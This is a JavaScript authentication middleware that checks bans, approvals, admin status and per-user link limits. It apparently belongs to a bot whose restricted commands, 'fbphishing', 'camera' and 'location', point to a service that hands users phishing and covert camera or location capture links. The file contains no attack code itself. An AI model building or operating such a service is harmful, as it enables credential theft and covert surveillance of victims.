const database = require('../utils/database');
const constants = require('../utils/constants');

class AuthMiddleware {
    
    async checkBan(userId) {
        try {
            const user = await database.query(
                'SELECT is_banned FROM users WHERE user_id = ?',
                [userId]
            );
            
            return user.length > 0 && user[0].is_banned === 1;
        } catch (error) {
            console.error('Check ban error:', error);
            return false;
        }
    }

    async checkPermission(userId, command) {
        try {
            const user = await database.query(
                'SELECT is_approved, is_banned FROM users WHERE user_id = ?',
                [userId]
            );

            // User not found in database
            if (user.length === 0) {
                return false;
            }

            // Check if banned
            if (user[0].is_banned) {
                return false;
            }

            // Check if approved
            if (!user[0].is_approved) {
                return false;
            }

            // Command specific permissions (if needed)
            const restrictedCommands = ['fbphishing', 'camera', 'location', 'all'];
            if (restrictedCommands.includes(command)) {
                // Add additional checks if needed
                // For example, check user's total links or data limit
                const stats = await database.query(
                    'SELECT total_links FROM users WHERE user_id = ?',
                    [userId]
                );
                
                // Example: Limit to 10 links per user
                if (stats[0].total_links >= 10) {
                    return false;
                }
            }

            return true;

        } catch (error) {
            console.error('Permission check error:', error);
            return false;
        }
    }

    async checkAdmin(userId) {
        const adminIds = process.env.ADMIN_IDS.split(',');
        return adminIds.includes(userId.toString());
    }
}

module.exports = new AuthMiddleware();